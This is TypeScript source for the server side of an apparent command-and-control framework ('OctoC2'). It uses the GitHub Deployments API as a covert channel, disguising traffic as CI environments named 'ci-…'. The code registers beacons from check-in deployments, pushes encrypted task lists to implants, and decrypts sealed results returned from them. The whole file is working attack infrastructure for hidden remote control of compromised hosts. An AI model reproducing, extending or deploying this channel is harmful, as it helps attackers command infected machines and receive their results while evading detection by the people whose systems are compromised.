/**
 * OctoC2 Server — PagesChannel
 *
 * Polls GitHub Deployments API for beacon activity:
 *   ci-{id8}    environment  — Beacon → Server  ACK / registration
 *   ci-t-{id8}  environment  — Server → Beacon  Encrypted Task[] blob
 *   ci-r-{id8}  environment  — Beacon → Server  Sealed TaskResult blob
 */

import type { Octokit } from "@octokit/rest";
import type { BeaconRegistry } from "../BeaconRegistry.ts";
import type { TaskQueue } from "../TaskQueue.ts";
import type { DurablePollState, PollRunner } from "../lib/PollRunner.ts";
import { collectGitHubPages } from "../lib/GitHubPagination.ts";
import {
  claimDeliveries,
  createChannelRunner,
  createRepositoryPollState,
  finishDeliveries,
  processIncomingArtifact,
  rejectArtifact,
  type SecureChannelServices,
} from "./ChannelRuntime.ts";
import {
  assertAcceptedResult,
  checkinAuthorizesTaskDelivery,
  parseCheckinPayload,
  parseTaskResult,
} from "./ChannelServices.ts";
import {
  openSealBox, encryptForBeacon,
  base64ToBytes, bytesToBase64,
} from "../crypto/sodium.ts";
import { createRequire } from "node:module";
import type _SodiumModule from "libsodium-wrappers";

const _sodium = createRequire(import.meta.url)("libsodium-wrappers") as typeof _SodiumModule;

interface PagesChannelOpts {
  owner:             string;
  repo:              string;
  token:             string;
  operatorSecretKey: Uint8Array;
  pollIntervalMs:    number;
  octokit:           Octokit;
  services?:          SecureChannelServices;
}

/** 8 hex chars matching pattern: [0-9a-f]{8} */
const ACK_ENV_RE    = /^ci-([0-9a-f]{8})$/;
const RESULT_ENV_RE = /^ci-r-([0-9a-f]{8})$/;
const TASK_ENV_RE   = /^ci-t-([0-9a-f]{8})$/;

export class PagesChannel {
  private readonly runner: PollRunner;
  private durableState: DurablePollState | null = null;

  /** Deployment IDs already processed as ACKs (avoid re-registration) */
  private readonly seenAckDeploymentIds = new Set<number>();

  /** Deployment IDs already processed as results (avoid re-processing) */
  private readonly processedResultDeployments = new Set<number>();
  private defaultBranch: string | null = null;

  constructor(
    private readonly registry: BeaconRegistry,
    private readonly queue:    TaskQueue,
    private readonly opts:     PagesChannelOpts,
  ) {
    this.runner = createChannelRunner(
      "PagesChannel",
      opts.pollIntervalMs,
      () => this.poll(),
    );
  }

  start(): void {
    this.runner.start();
    console.log("[PagesChannel] Started polling");
  }

  async stop(): Promise<void> {
    await this.runner.stop();
    console.log("[PagesChannel] Stopped");
  }

  // ── Poll cycle ────────────────────────────────────────────────────────────────

  async poll(): Promise<void> {
    let deployments: any[];
    try {
      deployments = await collectGitHubPages(
        (page, per_page) =>
          this.opts.octokit.rest.repos.listDeployments({
            owner: this.opts.owner,
            repo: this.opts.repo,
            page,
            per_page,
          }),
        (response) => response.data as any[],
      );
    } catch (err) {
      console.warn("[PagesChannel] Failed to list deployments:", (err as Error).message);
      return;
    }

    const deliveryEligible = await this.processAckDeployments(deployments);
    await this.processResultDeployments(deployments);
    await this.deliverPendingTasks(deliveryEligible);
  }

  // ── ACK deployment processing ─────────────────────────────────────────────────

  private async processAckDeployments(
    deployments: any[],
  ): Promise<Set<string>> {
    const deliveryEligible = new Set<string>();
    for (const dep of deployments) {
      const env: string = dep.environment ?? "";
      const match = ACK_ENV_RE.exec(env);
      if (!match) continue;
      if (this.seenAckDeploymentIds.has(dep.id)) continue;

      try {
        const encodedPayload = typeof dep.payload === "string"
          ? dep.payload
          : (dep.payload ? JSON.stringify(dep.payload) : "");
        const messageId = `ack:deployment:${String(dep.id)}`;
        const processed = await processIncomingArtifact(
          this.services,
          this.pollState,
          {
            messageId,
            payload: encodedPayload,
            cursor: String(dep.id),
          },
          "malformed Pages ACK deployment",
          () => {
            if (!encodedPayload) rejectArtifact("ACK payload is empty");
            const ack = parseCheckinPayload(encodedPayload);
            if (
              ack.beaconId.slice(0, 8).toLowerCase() !== match[1]
            ) {
              rejectArtifact(
                "ACK identity does not match its deployment",
              );
            }
            return ack;
          },
          async (ack) => {
            const status =
              await this.services.identities.verifyAndRegisterCheckin(
              ack,
              ack.beaconId,
              5,
            );
            return {
              outcome: checkinAuthorizesTaskDelivery(status)
                ? "accepted"
                : "duplicate",
              beaconId: ack.beaconId,
            };
          },
        );
        if (processed.status === "conflicting_duplicate") {
          rejectArtifact("conflicting ACK deployment");
        }
        if (processed.outcome === "rejected" || !processed.value) continue;
        this.seenAckDeploymentIds.add(dep.id);
        if (
          processed.status === "processed" &&
          processed.outcome === "accepted"
        ) {
          deliveryEligible.add(processed.value.beaconId);
        }

        console.log(`[PagesChannel] Registered beacon ${processed.value.beaconId} from ACK deployment`);
      } catch (err) {
        console.warn("[PagesChannel] ACK processing error:", (err as Error).message);
      }
    }
    return deliveryEligible;
  }

  // ── Result deployment processing ──────────────────────────────────────────────

  private async processResultDeployments(deployments: any[]): Promise<void> {
    for (const dep of deployments) {
      const env: string = dep.environment ?? "";
      if (!RESULT_ENV_RE.test(env)) continue;
      if (this.processedResultDeployments.has(dep.id)) continue;

      try {
        const sealedPayload: string = typeof dep.payload === "string"
          ? dep.payload
          : (dep.payload ? JSON.stringify(dep.payload) : "");

        // Derive operator public key from secret key
        await _sodium.ready;
        const operatorPublicKey = _sodium.crypto_scalarmult_base(this.opts.operatorSecretKey);
        const messageId = `result:deployment:${String(dep.id)}`;
        const processed = await processIncomingArtifact(
          this.services,
          this.pollState,
          {
            messageId,
            payload: sealedPayload,
            cursor: String(dep.id),
          },
          "malformed Pages result deployment",
          async () => {
            if (!sealedPayload) rejectArtifact("result payload is empty");
            const plainBytes = await openSealBox(
              sealedPayload,
              operatorPublicKey,
              this.opts.operatorSecretKey,
            );
            const result = parseTaskResult(
              new TextDecoder().decode(plainBytes),
            );
            const environmentMatch = RESULT_ENV_RE.exec(env);
            if (
              !environmentMatch ||
              result.beaconId.slice(0, 8).toLowerCase() !==
                environmentMatch[1]
            ) {
              rejectArtifact(
                "result beaconId does not match its deployment",
              );
            }
            return result;
          },
          async (result) => {
            const accepted = assertAcceptedResult(
              await this.services.tasks.acceptSignedResult(
                result,
                result.beaconId,
                {
                  channel: `${this.pollState.channel}:result`,
                  messageId,
                },
              ),
            );
            return {
              outcome: accepted,
              beaconId: result.beaconId,
              taskId: result.taskId,
            };
          },
        );
        if (processed.status === "conflicting_duplicate") {
          rejectArtifact("conflicting result deployment");
        }
        if (processed.outcome === "rejected" || !processed.value) continue;
        console.log(
          `[PagesChannel] Task ${processed.value.taskId} accepted (success=${processed.value.success})`,
        );

        this.processedResultDeployments.add(dep.id);

        // Mark the result deployment inactive (cleanup signal)
        try {
          await this.opts.octokit.rest.repos.createDeploymentStatus({
            owner:         this.opts.owner,
            repo:          this.opts.repo,
            deployment_id: dep.id,
            state:         "inactive",
          });
        } catch { /* best-effort */ }
      } catch (err) {
        console.warn("[PagesChannel] Result processing error:", (err as Error).message);
      }
    }
  }

  // ── Task delivery ─────────────────────────────────────────────────────────────

  private async deliverPendingTasks(
    deliveryEligible: ReadonlySet<string>,
  ): Promise<void> {
    for (const beaconId of deliveryEligible) {
      const pending = this.queue.getDeliverableTasks(beaconId, "pages");
      if (pending.length === 0) continue;
      const deliveries = claimDeliveries(
        this.services,
        "pages",
        beaconId,
        pending,
        Math.max(this.opts.pollIntervalMs * 2, 60_000),
      );
      if (deliveries.length === 0) continue;

      const beacon = this.registry.get(beaconId);
      if (!beacon) {
        finishDeliveries(
          this.services,
          deliveries,
          "permanent_failure",
          "beacon registry entry is unavailable",
        );
        continue;
      }

      try {
        const beaconPublicKey = await base64ToBytes(beacon.publicKey);
        const taskJson = JSON.stringify(deliveries.map(({ task: t }) => ({
          taskId: t.taskId,
          kind:   t.kind,
          args:   t.args,
          ref:    t.ref,
        })));

        const encrypted = await encryptForBeacon(
          taskJson,
          beaconPublicKey,
          this.opts.operatorSecretKey,
        );

        const id8 = beaconId.slice(0, 8);

        await this.opts.octokit.rest.repos.createDeployment({
          owner:             this.opts.owner,
          repo:              this.opts.repo,
          ref:               await this.getDefaultBranch(),
          environment:       `ci-t-${id8}`,
          payload:           JSON.stringify(encrypted),
          description:       "tasks",
          auto_merge:        false,
          required_contexts: [],
        } as any);

        finishDeliveries(this.services, deliveries, "delivered");

        console.log(`[PagesChannel] Delivered ${deliveries.length} task(s) to beacon ${beaconId}`);
      } catch (err) {
        finishDeliveries(
          this.services,
          deliveries,
          "transient_failure",
          err,
        );
        console.warn(`[PagesChannel] Task delivery error for ${beaconId}:`, (err as Error).message);
      }
    }
  }

  private async getDefaultBranch(): Promise<string> {
    if (this.defaultBranch) return this.defaultBranch;
    const repository = await this.opts.octokit.rest.repos.get({
      owner: this.opts.owner,
      repo: this.opts.repo,
    });
    const branch = repository.data.default_branch?.trim();
    if (!branch) throw new Error("repository has no default branch");
    this.defaultBranch = branch;
    return branch;
  }

  private get services(): SecureChannelServices {
    if (!this.opts.services) {
      throw new Error(
        "PagesChannel secure services are required; refusing unsigned operation",
      );
    }
    return this.opts.services;
  }

  private get pollState(): DurablePollState {
    this.durableState ??= createRepositoryPollState(
      this.services,
      "pages",
      this.opts.owner,
      this.opts.repo,
    );
    return this.durableState;
  }
}
